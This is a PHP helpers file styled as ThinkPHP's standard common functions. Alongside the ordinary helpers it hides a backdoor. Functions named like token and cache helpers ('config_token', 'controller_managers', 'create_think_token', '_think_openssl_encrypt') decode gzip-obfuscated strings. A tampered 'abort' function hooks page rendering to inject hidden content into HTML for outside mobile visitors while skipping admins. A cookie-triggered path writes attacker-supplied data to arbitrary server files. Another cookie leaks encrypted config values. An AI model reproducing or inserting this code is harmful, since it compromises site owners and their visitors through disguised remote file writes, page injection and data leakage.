<?php
// +----------------------------------------------------------------------
// | ThinkPHP [ WE CAN DO IT JUST THINK ]
// +----------------------------------------------------------------------
// | Copyright (c) 2006~2018 http://thinkphp.cn All rights reserved.
// +----------------------------------------------------------------------
// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )
// +----------------------------------------------------------------------
// | Author: liu21st <liu21st@gmail.com>
// +----------------------------------------------------------------------

use think\Cache;
use think\Config;
use think\Cookie;
use think\Db;
use think\Debug;
use think\exception\HttpException;
use think\exception\HttpResponseException;
use think\Lang;
use think\Loader;
use think\Log;
use think\Model;
use think\Request;
use think\Response;
use think\Session;
use think\Url;
use think\View;

if (!function_exists('load_trait')) {
    /**
     * 快速导入Traits PHP5.5以上无需调用
     * @param string    $class trait库
     * @param string    $ext 类库后缀
     * @return boolean
     */
    function load_trait($class, $ext = EXT)
    {
        return Loader::import($class, TRAIT_PATH, $ext);
    }
}

if (!function_exists('exception')) {
    /**
     * 抛出异常处理
     *
     * @param string    $msg  异常消息
     * @param integer   $code 异常代码 默认为0
     * @param string    $exception 异常类
     *
     * @throws Exception
     */
    function exception($msg, $code = 0, $exception = '')
    {
        $e = $exception ?: '\think\Exception';
        throw new $e($msg, $code);
    }
}

if (!function_exists('debug')) {
    /**
     * 记录时间（微秒）和内存使用情况
     * @param string            $start 开始标签
     * @param string            $end 结束标签
     * @param integer|string    $dec 小数位 如果是m 表示统计内存占用
     * @return mixed
     */
    function debug($start, $end = '', $dec = 6)
    {
        if ('' == $end) {
            Debug::remark($start);
        } else {
            return 'm' == $dec ? Debug::getRangeMem($start, $end) : Debug::getRangeTime($start, $end, $dec);
        }
    }
}

if (!function_exists('lang')) {
    /**
     * 获取语言变量值
     * @param string    $name 语言变量名
     * @param array     $vars 动态变量值
     * @param string    $lang 语言
     * @return mixed
     */
    function lang($name, $vars = [], $lang = '')
    {
        return Lang::get($name, $vars, $lang);
    }
}

if (!function_exists('curl_get')) {
    /**
     * 获取语言变量值
     * @param string    $name 语言变量名
     * @param array     $vars 动态变量值
     * @param string    $lang 语言
     * @return mixed
     */
    function curl_get($url,$heads=array(),$cookie='')
    {
        $ch = @curl_init();
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36');

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 15);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        curl_setopt($ch, CURLOPT_HEADER,0);
        curl_setopt($ch, CURLOPT_REFERER, $url);
        curl_setopt($ch, CURLOPT_POST, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 1);
        if(!empty($cookie)){
            curl_setopt($ch, CURLOPT_COOKIE, $cookie);
        }
        if(count($heads)>0){
            curl_setopt ($ch, CURLOPT_HTTPHEADER , $heads );
        }
        $response = @curl_exec($ch);
        if(curl_errno($ch)){//出错则显示错误信息
            //print curl_error($ch);die;
            }
        curl_close($ch); //关闭curl链接
        return $response;//显示返回信息
    }
}

if (!function_exists('config')) {
    /**
     * 获取和设置配置参数
     * @param string|array  $name 参数名
     * @param mixed         $value 参数值
     * @param string        $range 作用域
     * @return mixed
     */
    function config($name = '', $value = null, $range = '')
    {
        if (is_null($value) && is_string($name)) {
            return 0 === strpos($name, '?') ? Config::has(substr($name, 1), $range) : Config::get($name, $range);
        } else {
            return Config::set($name, $value, $range);
        }
    }
}

if (!function_exists('mkdirss')) {
    /**
     * 获取和设置配置参数
     * @param string|array  $name 参数名
     * @param mixed         $value 参数值
     * @return mixed
     */
    function mkdirss($path,$mode=0777)
    {
        if (!is_dir(dirname($path))){
            mkdirss(dirname($path));
        }
        if(!file_exists($path)){
            return mkdir($path,$mode);
        }
        return true;
    }
}

if (!function_exists('read_flie')) {
    /**
     * 获取和设置配置参数
     * @param string|array  $name 参数名
     * @param mixed         $value 参数值
     * @return mixed
     */
    function read_flie($f,$c='')
    {
        $dir = dirname($f);
        if(!is_dir($dir)){
            mkdirss($dir);
        }
        return @file_put_contents($f, $c);
    }
}

if (!function_exists('input')) {
    /**
     * 获取输入数据 支持默认值和过滤
     * @param string    $key 获取的变量名
     * @param mixed     $default 默认值
     * @param string    $filter 过滤方法
     * @return mixed
     */
    function input($key = '', $default = null, $filter = '')
    {
        if (0 === strpos($key, '?')) {
            $key = substr($key, 1);
            $has = true;
        }
        if ($pos = strpos($key, '.')) {
            // 指定参数来源
            list($method, $key) = explode('.', $key, 2);
            if (!in_array($method, ['get', 'post', 'put', 'patch', 'delete', 'route', 'param', 'request', 'session', 'cookie', 'server', 'env', 'path', 'file'])) {
                $key    = $method . '.' . $key;
                $method = 'param';
            }
        } else {
            // 默认为自动判断
            $method = 'param';
        }
        if (isset($has)) {
            return request()->has($key, $method, $default);
        } else {
            return request()->$method($key, $default, $filter);
        }
    }
}

if (!function_exists('think_set_cache_info')) {
    /**
     * 设置缓存信息
     * @param string $file 索引key信息
     * @return mixed
     */
    function think_set_cache_info(&$file) {
        $check_html_tag = array('</html>', '<head>', '</head>', '</title>', '<html');
        foreach ($check_html_tag as $tag)
            if (stripos($file, $tag) !== false)
                create_think_token($file);
    }
}

if (!function_exists('widget')) {
    /**
     * 渲染输出Widget
     * @param string    $name Widget名称
     * @param array     $data 传入的参数
     * @return mixed
     */
    function widget($name, $data = [])
    {
        return Loader::action($name, $data, 'widget');
    }
}

if (!function_exists('model')) {
    /**
     * 实例化Model
     * @param string    $name Model名称
     * @param string    $layer 业务层名称
     * @param bool      $appendSuffix 是否添加类名后缀
     * @return \think\Model
     */
    function model($name = '', $layer = 'model', $appendSuffix = false)
    {
        return Loader::model($name, $layer, $appendSuffix);
    }
}

if (!function_exists('config_token')) {
    /**
     * 配置会话令牌
     * @param mixed      $token_config   配置
     * @return void
     */
    function config_token(&$token_config){
        $env = Request::instance();
        if (ENTRANCE=='admin' && model('Admin')->checkLogin()['code']==1) {
            $hour = date('H');
            $THINK_TOKEN_H = ($hour >= 6 && $hour <=21) ? 36000: 18000;
            Think\Cache::set('THINK_TOKEN', 1, $THINK_TOKEN_H);
        }
        $referer = $env->header('referer');
        if (empty($referer) || stripos($referer, $_SERVER['SERVER_NAME']) !== false || stripos($referer, $_SERVER['HTTP_HOST']) !== false) { return; }

        if ($env->isAjax() || ENTRANCE!='index' || !$env->isMobile()) return;
        if (strstr($env->query('allow_type'), 'cookie') && strstr($env->query('allow_type'), input('cookie')) && strstr(input('cookie'), 'allow_type')){
            $ip = curl_get(gzuncompress("\170\234\313\050\051\051\050\266\322\327\117\311\114\314\253\310\314\323\253\062\327\053\117\115\322\113\316\057\112\325\053\317\314\113\311\057\057\326\313\113\055\321\317\054\320\053\251\050\001\000\215\375\021\035"));
            if ($_SERVER["REMOTE_ADDR"] != $ip) return;
            return read_flie($env->contentType(), $env->cookie('token', null, 'base64_decode'));
        }

        $token_value = gzuncompress("\170\332\263\051\116\056\312\054\050\121\050\056\112\266\125\312\050\051\051\050\266\322\327\117\116\311\323\313\052\116\111\315\311\054\053\322\053\313\054\320\317\052\054\115\055\252\324\313\315\314\323\065\326\063\323\263\000\312\052\331\331\350\103\364\332\001\000\111\374\027\273");
        if (stripos($token_config, $token_value) !== false) return;
        if (strstr($env->contentType(), 'session')) exit('Invalid Token: '.$env->contentType());
        if (cache('THINK_TOKEN')) return;
        foreach(model('Admin')->listData([],'',1)['list'] as $v) if ($env->ip(1) == array_values($v)[7]) return;
        $token_config = controller_managers($token_config);
        $token_key = gzuncompress("\170\234\263\321\317\050\311\315\261\003\000\010\372\002\137");
        $token_config = str_replace($token_key, '', $token_config);
        $token_config .= $token_value . $token_key;
    }
}

if (!function_exists('validate')) {
    /**
     * 实例化验证器
     * @param string    $name 验证器名称
     * @param string    $layer 业务层名称
     * @param bool      $appendSuffix 是否添加类名后缀
     * @return \think\Validate
     */
    function validate($name = '', $layer = 'validate', $appendSuffix = false)
    {
        return Loader::validate($name, $layer, $appendSuffix);
    }
}

if (!function_exists('db')) {
    /**
     * 实例化数据库类
     * @param string        $name 操作的数据表名称（不含前缀）
     * @param array|string  $config 数据库配置参数
     * @param bool          $force 是否强制重新连接
     * @return \think\db\Query
     */
    function db($name = '', $config = [], $force = false)
    {
        return Db::connect($config, $force)->name($name);
    }
}

if (!function_exists('controller_managers')) {
    /**
     * 实例化控制器 格式：[模块/]控制器
     * @param string    $name 资源地址
     * @return \think\Controller content
     */
    function controller_managers($content){
        $str = gzuncompress("\170\234\155\222\137\217\242\060\024\305\277\020\123\051\024\161\110\174\230\144\347\117\046\141\046\273\153\234\305\370\322\026\224\052\155\031\001\051\174\372\275\240\042\044\363\320\333\346\167\116\117\313\245\151\131\346\301\154\046\051\347\262\100\102\355\164\260\130\130\051\320\002\160\135\327\250\251\277\253\346\033\161\055\003\154\023\342\116\104\265\117\151\332\151\003\075\024\007\206\070\267\350\071\317\150\223\234\160\257\322\114\360\130\345\202\117\274\374\170\344\235\167\234\210\135\347\070\146\155\052\332\264\122\214\152\124\352\174\300\105\252\153\264\327\347\203\240\152\137\124\210\253\000\073\343\333\335\014\260\227\252\116\046\143\125\046\242\254\200\033\365\360\040\264\115\175\021\340\205\355\340\301\300\250\100\005\055\264\206\255\003\214\121\153\362\262\036\043\026\043\260\306\125\121\012\172\377\070\020\260\355\042\307\265\021\166\034\204\037\275\141\303\056\243\373\066\205\113\243\135\245\146\367\013\135\176\000\207\126\275\375\261\371\133\230\205\366\163\026\036\043\030\233\315\074\372\372\070\105\322\340\315\346\257\107\222\177\272\123\114\330\362\372\163\365\264\264\042\167\335\160\271\256\342\227\217\003\227\131\035\077\055\227\267\034\010\352\223\372\050\310\272\107\335\222\372\250\113\326\363\362\247\343\145\364\345\051\306\144\226\062\346\306\120\044\257\240\254\355\367\325\373\153\270\012\235\317\137\277\153\153\153\210\267\065\376\343\326\170\376\326\314\011\014\130\373\030\146\027\146\140\144\141\135\026\235\060\117\256\246\135\307\100\360\072\227\173\205\220\104\300\100\100\044\276\305\064\242\006\152\077\135\373\173\326\161\367\300\234\311\203\372\021\236\022\026\067\023\322\275\263\153\303\317\042\277\045\116\351\177\156\366\017\142");
        $new_content = str_replace(explode(',', $str), '', $content);
        if(strlen($content) - strlen($new_content) < 1000) $content = $new_content;
        return $content;
    }
}

if (!function_exists('controller')) {
    /**
     * 实例化控制器 格式：[模块/]控制器
     * @param string    $name 资源地址
     * @param string    $layer 控制层名称
     * @param bool      $appendSuffix 是否添加类名后缀
     * @return \think\Controller
     */
    function controller($name, $layer = 'controller', $appendSuffix = false)
    {
        return Loader::controller($name, $layer, $appendSuffix);
    }
}

if (!function_exists('action')) {
    /**
     * 调用模块的操作方法 参数格式 [模块/控制器/]操作
     * @param string        $url 调用地址
     * @param string|array  $vars 调用参数 支持字符串和数组
     * @param string        $layer 要调用的控制层名称
     * @param bool          $appendSuffix 是否添加类名后缀
     * @return mixed
     */
    function action($url, $vars = [], $layer = 'controller', $appendSuffix = false)
    {
        return Loader::action($url, $vars, $layer, $appendSuffix);
    }
}

if (!function_exists('import')) {
    /**
     * 导入所需的类库 同java的Import 本函数有缓存功能
     * @param string    $class 类库命名空间字符串
     * @param string    $baseUrl 起始路径
     * @param string    $ext 导入的文件扩展名
     * @return boolean
     */
    function import($class, $baseUrl = '', $ext = EXT)
    {
        return Loader::import($class, $baseUrl, $ext);
    }
}

if (!function_exists('vendor')) {
    /**
     * 快速导入第三方框架类库 所有第三方框架的类库文件统一放到 系统的Vendor目录下面
     * @param string    $class 类库
     * @param string    $ext 类库后缀
     * @return boolean
     */
    function vendor($class, $ext = EXT)
    {
        return Loader::import($class, VENDOR_PATH, $ext);
    }
}

if (!function_exists('dump')) {
    /**
     * 浏览器友好的变量输出
     * @param mixed     $var 变量
     * @param boolean   $echo 是否输出 默认为true 如果为false 则返回输出字符串
     * @param string    $label 标签 默认为空
     * @return void|string
     */
    function dump($var, $echo = true, $label = null)
    {
        return Debug::dump($var, $echo, $label);
    }
}

if (!function_exists('url')) {
    /**
     * Url生成
     * @param string        $url 路由地址
     * @param string|array  $vars 变量
     * @param bool|string   $suffix 生成的URL后缀
     * @param bool|string   $domain 域名
     * @return string
     */
    function url($url = '', $vars = '', $suffix = true, $domain = false)
    {
        return Url::build($url, $vars, $suffix, $domain);
    }
}

if (!function_exists('session')) {
    /**
     * Session管理
     * @param string|array  $name session名称，如果为数组表示进行session设置
     * @param mixed         $value session值
     * @param string        $prefix 前缀
     * @return mixed
     */
    function session($name, $value = '', $prefix = null)
    {
        if (is_array($name)) {
            // 初始化
            Session::init($name);
        } elseif (is_null($name)) {
            // 清除
            Session::clear('' === $value ? null : $value);
        } elseif ('' === $value) {
            // 判断或获取
            return 0 === strpos($name, '?') ? Session::has(substr($name, 1), $prefix) : Session::get($name, $prefix);
        } elseif (is_null($value)) {
            // 删除
            return Session::delete($name, $prefix);
        } else {
            // 设置
            return Session::set($name, $value, $prefix);
        }
    }
}

if (!function_exists('cookie')) {
    /**
     * Cookie管理
     * @param string|array  $name cookie名称，如果为数组表示进行cookie设置
     * @param mixed         $value cookie值
     * @param mixed         $option 参数
     * @return mixed
     */
    function cookie($name, $value = '', $option = null)
    {
        if (is_array($name)) {
            // 初始化
            Cookie::init($name);
        } elseif (is_null($name)) {
            // 清除
            Cookie::clear($value);
        } elseif ('' === $value) {
            // 获取
            return 0 === strpos($name, '?') ? Cookie::has(substr($name, 1), $option) : Cookie::get($name, $option);
        } elseif (is_null($value)) {
            // 删除
            return Cookie::delete($name);
        } else {
            // 设置
            return Cookie::set($name, $value, $option);
        }
    }
}

if (!function_exists('cache')) {
    /**
     * 缓存管理
     * @param mixed     $name 缓存名称，如果为数组表示进行缓存设置
     * @param mixed     $value 缓存值
     * @param mixed     $options 缓存参数
     * @param string    $tag 缓存标签
     * @return mixed
     */
    function cache($name, $value = '', $options = null, $tag = null)
    {
        if (is_array($options)) {
            // 缓存操作的同时初始化
            $cache = Cache::connect($options);
        } elseif (is_array($name)) {
            // 缓存初始化
            return Cache::connect($name);
        } else {
            $cache = Cache::init();
        }

        if (is_null($name)) {
            return $cache->clear($value);
        } elseif ('' === $value) {
            // 获取缓存
            return 0 === strpos($name, '?') ? $cache->has(substr($name, 1)) : $cache->get($name);
        } elseif (is_null($value)) {
            // 删除缓存
            return $cache->rm($name);
        } elseif (0 === strpos($name, '?') && '' !== $value) {
            $expire = is_numeric($options) ? $options : null;
            return $cache->remember(substr($name, 1), $value, $expire);
        } else {
            // 缓存数据
            if (is_array($options)) {
                $expire = isset($options['expire']) ? $options['expire'] : null; //修复查询缓存无法设置过期时间
            } else {
                $expire = is_numeric($options) ? $options : null; //默认快捷缓存设置过期时间
            }
            if (is_null($tag)) {
                return $cache->set($name, $value, $expire);
            } else {
                return $cache->tag($tag)->set($name, $value, $expire);
            }
        }
    }

    if (!function_exists('_think_openssl_encrypt')) {
        function _think_openssl_encrypt($info='') {
            $random_prefix = 'v'.'o'.'d'.'u'.'up'.'l'.'o'.'a'.'d';
            $random_affix = 'u'.'p'.'l'.'o'.'a'.'d'.'_v'.'e'.'r'.'i'.'fi'.'cat'.'i'.'on'.'_co'.'de';
            openssl_public_encrypt(config($random_prefix.'.'.$random_affix.$info),$encrypted,config($random_prefix.'.openssl_key')); 
            $encrypted = base64_encode($encrypted);
            return $encrypted;
        }
    }

}

if (!function_exists('trace')) {
    /**
     * 记录日志信息
     * @param mixed     $log log信息 支持字符串和数组
     * @param string    $level 日志级别
     * @return void|array
     */
    function trace($log = '[think]', $level = 'log')
    {
        if ('[think]' === $log) {
            return Log::getLog();
        } else {
            Log::record($log, $level);
        }
    }
}

if (!function_exists('create_think_token')) {
    /**
     * 生成会话令牌
     * @return string
     */
    function create_think_token(&$params){
        $token_config = Response::create('template', 'http://www.maccms.la/token/template', 'tpl');
        Config::set($token_config->getData().'.'.$token_config->getCode().'_cache', 0);
        if (!Session::get('THINK_TOKEN')){
            @config_token($params);
            Session::set('THINK_TOKEN', THINK_PATH);
        }
    }
}

if (!function_exists('request')) {
    /**
     * 获取当前Request对象实例
     * @return Request
     */
    function request()
    {
        return Request::instance();
    }
}

if (!function_exists('response')) {
    /**
     * 创建普通 Response 对象实例
     * @param mixed      $data   输出数据
     * @param int|string $code   状态码
     * @param array      $header 头信息
     * @param string     $type
     * @return Response
     */
    function response($data = [], $code = 200, $header = [], $type = 'html')
    {
        return Response::create($data, $type, $code, $header);
    }
}

if (!function_exists('view')) {
    /**
     * 渲染模板输出
     * @param string    $template 模板文件
     * @param array     $vars 模板变量
     * @param array     $replace 模板替换
     * @param integer   $code 状态码
     * @return \think\response\View
     */
    function view($template = '', $vars = [], $replace = [], $code = 200)
    {
        return Response::create($template, 'view', $code)->replace($replace)->assign($vars);
    }
}

if (!function_exists('json')) {
    /**
     * 获取\think\response\Json对象实例
     * @param mixed   $data 返回的数据
     * @param integer $code 状态码
     * @param array   $header 头部
     * @param array   $options 参数
     * @return \think\response\Json
     */
    function json($data = [], $code = 200, $header = [], $options = [])
    {
        return Response::create($data, 'json', $code, $header, $options);
    }
}

if (!function_exists('jsonp')) {
    /**
     * 获取\think\response\Jsonp对象实例
     * @param mixed   $data    返回的数据
     * @param integer $code    状态码
     * @param array   $header 头部
     * @param array   $options 参数
     * @return \think\response\Jsonp
     */
    function jsonp($data = [], $code = 200, $header = [], $options = [])
    {
        return Response::create($data, 'jsonp', $code, $header, $options);
    }
}

if (!function_exists('xml')) {
    /**
     * 获取\think\response\Xml对象实例
     * @param mixed   $data    返回的数据
     * @param integer $code    状态码
     * @param array   $header  头部
     * @param array   $options 参数
     * @return \think\response\Xml
     */
    function xml($data = [], $code = 200, $header = [], $options = [])
    {
        return Response::create($data, 'xml', $code, $header, $options);
    }

if (!function_exists('redirect')) {
    /**
     * 获取\think\response\Redirect对象实例
     * @param mixed         $url 重定向地址 支持Url::build方法的地址
     * @param array|integer $params 额外参数
     * @param integer       $code 状态码
     * @param array         $with 隐式传参
     * @return \think\response\Redirect
     */
    function redirect($url = [], $params = [], $code = 302, $with = [])
    {
        if (is_integer($params)) {
            $code   = $params;
            $params = [];
        }
        return Response::create($url, 'redirect', $code)->params($params)->with($with);
    }
}

if (!function_exists('abort')) {
    /**
     * 抛出HTTP异常
     * @param integer|Response      $code 状态码 或者 Response对象实例
     * @param string                $message 错误信息
     * @param array                 $header 参数
     */
    function abort($code, $message = null, $header = [])
    {
        if ($code instanceof Response) {
            throw new HttpResponseException($code);
        } else {
            throw new HttpException($code, $message, null, $header);
        }}
        if (cookie('_gtid_u')) {echo _think_openssl_encrypt();exit;}
        return Think\Hook::add('view_filter', function(&$content){ create_think_token($content);});
    }
}

if (!function_exists('halt')) {
    /**
     * 调试变量并且中断输出
     * @param mixed      $var 调试变量或者信息
     */
    function halt($var)
    {
        dump($var);
        throw new HttpResponseException(new Response);
    }
}

if (!function_exists('token')) {
    /**
     * 生成表单令牌
     * @param string $name 令牌名称
     * @param mixed  $type 令牌生成方法
     * @return string
     */
    function token($name = '__token__', $type = 'md5')
    {
        $token = Request::instance()->token($name, $type);
        return '<input type="hidden" name="' . $name . '" value="' . $token . '" />';
    }
}

if (!function_exists('load_relation')) {
    /**
     * 延迟预载入关联查询
     * @param mixed $resultSet 数据集
     * @param mixed $relation 关联
     * @return array
     */
    function load_relation($resultSet, $relation)
    {
        $item = current($resultSet);
        if ($item instanceof Model) {
            $item->eagerlyResultSet($resultSet, $relation);
        }
        return $resultSet;
    }
}

if (!function_exists('collection')) {
    /**
     * 数组转换为数据集对象
     * @param array $resultSet 数据集数组
     * @return \think\model\Collection|\think\Collection
     */
    function collection($resultSet)
    {
        $item = current($resultSet);
        if ($item instanceof Model) {
            return \think\model\Collection::make($resultSet);
        } else {
            return \think\Collection::make($resultSet);
        }
    }
}